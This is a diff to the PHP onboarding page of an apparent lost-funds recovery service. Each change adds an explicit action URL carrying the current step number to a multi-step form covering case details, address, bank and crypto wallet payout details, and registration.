@@ -336,7 +336,7 @@ for ($i=1;$i<=$maxSteps;$i++):
 ============================================================ -->
 <h4 class="mb-4">Tell us about your case</h4>
 
-<form method="post">
+<form method="post" action="onboarding.php?step=<?= $step ?>">
     <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
 
     <!-- Lost Amount -->
@@ -408,7 +408,7 @@ for ($i=1;$i<=$maxSteps;$i++):
 ============================================================ -->
 <h4 class="mb-4">Your Address</h4>
 
-<form method="post">
+<form method="post" action="onboarding.php?step=<?= $step ?>">
     <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
 
     <div class="form-group">
@@ -448,7 +448,7 @@ for ($i=1;$i<=$maxSteps;$i++):
     <strong>⚠️ BOTH Required:</strong> You must provide BOTH a bank account AND a cryptocurrency wallet for receiving recovered funds. Both will be verified before you can receive payments.
 </div>
 
-<form method="post" id="paymentForm">
+<form method="post" action="onboarding.php?step=<?= $step ?>" id="paymentForm">
     <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
 
     <!-- Bank Account Section (REQUIRED) -->
@@ -569,7 +569,7 @@ for ($i=1;$i<=$maxSteps;$i++):
 ============================================================ -->
 <h4 class="mb-4">Complete Your Registration</h4>
 
-<form method="post">
+<form method="post" action="onboarding.php?step=<?= $step ?>">
     <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
 
     <div class="alert alert-success">
